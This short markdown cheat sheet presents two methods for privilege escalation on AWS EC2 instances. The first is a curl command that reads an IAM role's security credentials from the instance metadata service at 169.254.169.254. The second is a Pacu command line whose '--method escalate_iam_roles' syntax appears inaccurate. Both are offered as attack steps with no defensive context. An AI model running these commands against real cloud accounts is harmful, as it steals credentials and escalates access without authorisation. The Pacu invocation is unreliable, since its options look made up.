# Privilege escalation through EC2 metadata

### Method 1
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```
* `curl`: The command-line tool used to perform the HTTP request.
* `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>`: The URL endpoint of the metadata service to retrieve the security credentials for the specified IAM role. Replace <role_name> with the name of the IAM role.


### Method 2
```bash
python3 pacu.py --method escalate_iam_roles --profile <aws_profile> --regions <aws_region> --instances <instance_id>
```
* In this command, the [pacu.py script](https://github.com/RhinoSecurityLabs/pacu) is being executed with the `escalate_iam_roles` method, which is specifically designed to escalate privileges associated with IAM roles.
* `--profile` option specifies the AWS profile to use for authentication.
* `--regions` option specifies the AWS regions to target. 
* `--instances` option is used to specify the target EC2 instance ID(s) on which the IAM roles will be escalated.






















































